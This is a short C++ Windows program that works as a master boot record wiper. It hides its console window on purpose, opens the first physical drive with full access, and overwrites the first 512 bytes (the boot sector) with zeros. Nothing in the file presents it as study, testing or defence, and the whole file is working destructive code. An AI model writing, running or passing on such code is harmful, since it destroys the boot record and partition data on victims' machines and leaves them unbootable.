#include <Windows.h>
#include <iostream>

using namespace std;

int main()
{
	FreeConsole(); // hiding the console
	char mbrData[512]; 
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); //opening an handle to drive0
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL); 
	CloseHandle(MBR);
}
